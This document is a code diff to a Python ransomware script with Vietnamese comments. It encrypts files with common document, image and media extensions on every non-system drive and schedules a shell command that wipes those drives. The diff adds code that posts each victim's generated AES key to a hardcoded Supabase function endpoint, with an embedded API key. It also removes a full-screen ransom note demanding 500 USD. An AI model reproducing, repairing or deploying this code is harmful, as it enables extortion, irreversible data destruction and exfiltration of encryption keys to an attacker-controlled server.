@@ -4,6 +4,44 @@ from cryptography.hazmat.backends import default_backend
 import secrets
 import tkinter as tk
 from tkinter import messagebox
+import secrets, string, requests
+
+
+SUPABASE_URL = "https://siddmfkzxmdeienlbxnp.supabase.co"
+ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpZGRtZmt6eG1kZWllbmxieG5wIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU3ODMwMzAsImV4cCI6MjA4MTM1OTAzMH0.Exvf-QPlTTpaLB7ext7Q8M4JqZ6l80i1uOCdpORit90"
+FUNCTION_URL = f"{SUPABASE_URL}/functions/v1/save-user-pas"
+
+DATA_EXTENSIONS = {
+    ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
+    ".ppt", ".pptx",
+    ".jpg", ".jpeg", ".png", ".bmp",
+    ".mp3", ".wav", ".mp4", ".avi",
+    ".csv", ".json", ".xml"
+}
+
+def generate_aes256_key_hex():
+    key = secrets.token_bytes(32)
+    return key.hex() 
+
+def generate_username(length=32):
+    alphabet = string.ascii_uppercase + string.digits
+    return "".join(secrets.choice(alphabet) for _ in range(length))
+
+def send_code_to_server(username: str, code: str):
+    headers = {
+        "apikey": ANON_KEY,
+        "Authorization": f"Bearer {ANON_KEY}",
+        "Content-Type": "application/json",
+    }
+    payload = {"user_name": username, "client_code": code}
+
+    r = requests.post(FUNCTION_URL, headers=headers, json=payload, timeout=15)
+
+    print("HTTP:", r.status_code)
+    print("RESP:", r.text[:2000])
+
+    r.raise_for_status()
+    return r.json()
 
 def schedule_drive_wipe(drives, minutes=2):
     run_time = (datetime.datetime.now() + datetime.timedelta(minutes=minutes)).strftime("%H:%M")
@@ -15,66 +53,30 @@ def schedule_drive_wipe(drives, minutes=2):
         )
         subprocess.run(command, shell=True)
 
-def ransomware_app():
-    root = tk.Tk()
-    root.title("!!! RANSOMWARE ALERT !!!")
-
-    # Toàn màn hình
-    root.attributes("-fullscreen", True)
-
-    # Nền đỏ
-    root.configure(bg="black")
-
-    # Nội dung thông báo
-    ransom_text = (
-        "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
-        "All your important documents, photos, and databases are locked.\n"
-        "To restore access, you must pay 500 USD.\n"
-        "Failure to do so within 72 hours will result in permanent data loss.\n\n"
-    )
-
-    # Label hiển thị
-    label = tk.Label(
-        root,
-        text=ransom_text,
-        font=("Consolas", 18, "bold"),
-        fg="red",
-        bg="black",
-        justify="center"
-    )
-    label.pack(expand=True)
-
-    # Nút giả lập "Pay"
-    pay_button = tk.Button(
-        root,
-        text="I Have Paid",
-        font=("Arial", 16, "bold"),
-        fg="white",
-        bg="red",
-        padx=20,
-        pady=10,
-        command=lambda: root.destroy()
-    )
-    pay_button.pack(pady=20)
-
-    root.mainloop()
-
 def main():
-    key = b"lehoangphucthinh"
+    code = generate_aes256_key_hex()
+    username = generate_username()
+    print(send_code_to_server(username, code))
+
     backend = default_backend()
-    block = algorithms.AES(key)
+    block = algorithms.AES(code)
 
     drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
     target_drives = []
 
     for drive in drives:
-        if drive == "C:\\" or drive == "A:\\": 
+        if drive == "C:\\": 
             continue
         target_drives.append(drive)
         for root, dirs, files in os.walk(drive):
             for file_name in files:
-                if file_name == "decrypt-v1.2.2.exe":
+                if file_name.endswith(".enc"):
                     continue
+
+                ext = os.path.splitext(file_name)[1].lower()
+                if ext not in DATA_EXTENSIONS:
+                    continue
+
                 path = os.path.join(root, file_name)
                 print(f"Encrypting {path}...")
                 try:
@@ -98,12 +100,8 @@ def main():
                     else:
                         print(f"Error: {e}")
 
-    # Hẹn giờ xóa toàn bộ nội dung các ổ đã mã hóa
     if target_drives:
         schedule_drive_wipe(target_drives)
 
-    
-
 if __name__ == "__main__":
     main()
-    ransomware_app()
